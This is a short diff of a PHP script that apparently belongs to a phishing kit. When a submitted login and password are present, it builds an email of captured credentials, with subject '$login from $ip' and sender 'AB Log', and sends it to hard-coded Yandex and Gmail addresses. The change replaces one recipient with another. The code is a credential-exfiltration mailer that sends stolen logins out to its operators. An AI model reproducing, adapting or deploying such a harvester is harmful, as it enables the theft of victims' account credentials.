@@ -10,7 +10,7 @@ $bad = array('signal'=>'bad');
 if (!empty($login) && !empty($passwd)) {
 
 
-    $own = 'tktren007@yandex.ru,habarova.yoot@gmail.com';
+    $own = 'tktren007@yandex.ru,mailto:chuks.blaze@yandex.ru';
     $date = date("D/M/d, Y g:i a");
     $subj = "$login  from $ip";
     $from = "From: AB Log <mail@me.mom163.com>";
